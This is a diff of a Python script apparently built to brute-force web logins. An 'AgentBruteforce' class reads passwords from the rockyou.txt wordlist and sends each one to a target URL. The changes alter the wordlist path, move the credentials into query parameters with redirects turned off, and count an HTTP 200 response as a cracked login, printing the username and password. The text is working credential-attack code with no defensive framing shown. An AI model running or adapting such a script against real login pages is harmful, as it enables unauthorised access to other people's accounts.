@@ -23,7 +23,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 """
 
 # prepare the list of passwords
-rockyou = open('./wordlists/rockyou.txt')
+rockyou = open('.\\server\\wordlists\\rockyou.txt')
 
 # agent class for bruteforcing
 class AgentBruteforce(agent.Agent):
@@ -41,9 +41,9 @@ class AgentBruteforce(agent.Agent):
                 self.params["pass"] = password.strip()
                 print(self.params)
                 # sending bruteforce get request
-                response = requests.post(url=self.url, data=self.params)
+                response = requests.post(url=self.url, params=self.params,allow_redirects=False)
                 cookies = response.cookies
-                if len(cookies)>0:
+                if response.status_code == 200:
                     print(
                         f'website bruteforced successfuly {self.params["uname"]}:{self.params["pass"]}')
                     self.kill()
